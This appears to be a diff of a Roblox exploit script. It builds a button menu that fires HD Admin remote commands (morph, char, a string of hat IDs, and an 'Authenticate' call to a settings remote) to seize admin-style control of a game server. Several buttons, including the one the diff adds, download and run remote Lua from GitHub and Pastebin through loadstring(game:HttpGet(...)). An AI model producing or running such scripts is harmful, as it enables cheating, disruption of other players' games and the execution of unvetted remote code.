@@ -50,7 +50,7 @@ local A_1 = ";morph me Noob1 "
 local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
 Event:InvokeServer(A_1)
  
-local A_1 = ";char me "
+local A_1 = ";char me nato1231231Qw"
 local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
 Event:InvokeServer(A_1)
 	end,
@@ -86,7 +86,7 @@ local Button = homeTab:CreateButton({
         game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
         wait(2)
         local args = {
-            [1] = ";char me"
+            [1] = ";char me nato1231231Qw"
         }
         
         game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
@@ -163,7 +163,7 @@ local A_1 = ";morph me Noob1 "
 local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
 Event:InvokeServer(A_1)
  
-local A_1 = ";char me "
+local A_1 = ";char me nato1231231Qw"
 local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
 Event:InvokeServer(A_1)
     wait(2)
@@ -194,7 +194,7 @@ local Button = feTab:CreateButton({
  local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
  Event:InvokeServer(A_1)
   
- local A_1 = ";char me "
+ local A_1 = ";char me nato1231231Qw"
  local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
  Event:InvokeServer(A_1)
      wait(2)
@@ -232,7 +232,7 @@ local Button = feTab:CreateButton({
  local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
  Event:InvokeServer(A_1)
   
- local A_1 = ";char me "
+ local A_1 = ";char me nato1231231Qw"
  local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
  Event:InvokeServer(A_1)
      wait(2)
@@ -281,7 +281,7 @@ local Button = feTab:CreateButton({
         local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
         Event:InvokeServer(A_1)
          
-        local A_1 = ";char me "
+        local A_1 = ";char me nato1231231Qw"
         local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
         Event:InvokeServer(A_1)
             wait(2)
@@ -548,5 +548,91 @@ local Button = adminTab:CreateButton({
 	Name = "iv Admin v2",
 	Callback = function()
 		loadstring(game:HttpGet('https://raw.githubusercontent.com/BloodyBurns/Hexx/main/Iv%20Admin/Admin%202.lua'))()
+	end,
+})
+
+local Button = feTab:CreateButton({
+	Name = "تلفزيون",
+	Callback = function()
+
+ local A_1 = ";morph me Slender "
+local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
+Event:InvokeServer(A_1)
+ 
+local A_1 = "Authenticate"
+local Event = game:GetService("Workspace").Boards.SettingsHandler.Retriever
+Event:InvokeServer(A_1)
+ 
+local A_1 = ";morph me Noob1 "
+local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
+Event:InvokeServer(A_1)
+ 
+local A_1 = ";char me nato1231231Qw"
+local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
+Event:InvokeServer(A_1)
+    wait(2)
+
+local args = {
+        [1] = ";hat me 376526673"
+    }
+game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
+    wait(1)
+
+    local args = {
+        [1] = ";hat me 376524487"
+    }
+game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
+    wait(1)
+
+    local args = {
+        [1] = ";hat me 6470135113"
+    }
+game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
+    wait(1)
+
+    local args = {
+        [1] = ";hat me 62724852"
+    }
+game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
+    wait(1)
+
+    local args = {
+        [1] = ";hat me 48474294"
+    }
+game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
+    wait(1)
+
+    local args = {
+        [1] = ";hat me 376527500"
+    }
+game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
+    wait(1)
+
+    local args = {
+        [1] = ";hat me 9350274205"
+    }
+game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
+    wait(1)
+
+    local args = {
+        [1] = ";hat me 9661543986"
+    }
+game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
+    wait(1)
+
+    local args = {
+        [1] = ";hat me 2309346267"
+    }
+game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
+    wait(1)
+
+
+    game:GetService("StarterGui"):SetCore("SendNotification",{
+                    Title = "LOADING..";
+                    Text = "MODES : Q & E";
+                 Duration = 3;
+                })
+loadstring(game:HttpGet('https://pastebin.com/raw/9qnY2Fwp'))()
+
 	end,
 })
